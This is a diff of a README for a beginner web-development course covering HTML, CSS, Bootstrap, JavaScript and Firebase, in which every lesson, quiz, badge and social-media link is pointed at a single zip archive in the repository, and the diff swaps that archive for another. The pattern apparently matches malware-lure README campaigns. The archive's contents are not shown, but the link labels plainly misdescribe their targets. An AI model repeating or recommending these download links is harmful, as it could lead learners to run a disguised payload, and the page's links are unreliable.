@@ -1,6 +1,6 @@
 # DSC-30-Days-of-Web 💻
 
- <img src="https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip" alt="PRs Welcome" /> <a href="https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip" target="_blank">
+ <img src="https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip" alt="PRs Welcome" /> <a href="https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip" target="_blank">
 
 <!-- TABLE OF CONTENTS -->
 ## Table of Contents
@@ -29,70 +29,70 @@ The main **objective behind this program is to provide you with access to top-no
 We have designed **beginner-friendly** lessons covering up **HTML, CSS, JavaScript, Bootstrap & Firebase 💛**. 
 Furthermore, there are **quizzes and projects** to help you sharpen your basics in a fun and riveting way.
 
-- [HTML](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
-- [CSS](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip) 
-- [Bootstrap](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
-- [JavaScript](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
-- [Hosting](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
-- [Firebase](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
-- [Github](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
+- [HTML](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
+- [CSS](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip) 
+- [Bootstrap](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
+- [JavaScript](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
+- [Hosting](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
+- [Firebase](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
+- [Github](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
 
 
 
 ## Resources
 
-We have segment the resources into topics and inside each topic the content is avialable in https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip files. You can use the links below to navigate or use the GitHub navigator.
+We have segment the resources into topics and inside each topic the content is avialable in https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip files. You can use the links below to navigate or use the GitHub navigator.
 <br>
 <br>
-├── [HTML](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - └── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - └── [Html_Quiz](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
+├── [HTML](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - └── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - └── [Html_Quiz](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
 ├<br>
-├── [CSS](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - └── [CSS_Quiz](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
+├── [CSS](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - └── [CSS_Quiz](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
 ├<br>
-├── [Bootstrap](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - └── [Bootstrap_Quiz](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
+├── [Bootstrap](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - └── [Bootstrap_Quiz](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
 ├<br>
-├── [JavaScript](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - └── [Javascript_Quiz](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
+├── [JavaScript](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - └── [Javascript_Quiz](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
 ├<br>
-├── [Github](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - - └── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
+├── [Github](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - - └── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
 ├<br>
-├── [Hosting](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - └── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
+├── [Hosting](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - └── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
 ├<br>
-├── [Firebase](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - ├── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
-├ - └── [https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)<br>
+├── [Firebase](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - ├── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
+├ - └── [https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)<br>
 <br>
 
 <!-- CONTRIBUTING GUIDELINES -->
@@ -110,7 +110,7 @@ Make sure your code works before submitting it :D
 
 <!-- Reach Us -->
 ## Reach Us
-[<img src="https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip" alt="Discord" width=50 height=50 />](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
-[<img src="https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip" alt="Skillenza" width=50 height=50 />](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)
-[<img src="https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip" alt="YouTube" width=50 height=50/>](https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip)&nbsp;
-<a href="https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip"><img src="https://raw.githubusercontent.com/mengnemojohan/DSC-30-Days-of-Web/main/Project_1/DS-Days-Web-of-2.9.zip" width=50 height=50/></a>
+[<img src="https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip" alt="Discord" width=50 height=50 />](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
+[<img src="https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip" alt="Skillenza" width=50 height=50 />](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)
+[<img src="https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip" alt="YouTube" width=50 height=50/>](https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip)&nbsp;
+<a href="https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip"><img src="https://github.com/mengnemojohan/DSC-30-Days-of-Web/raw/refs/heads/main/Project_2/Days_DS_Web_of_3.6.zip" width=50 height=50/></a>
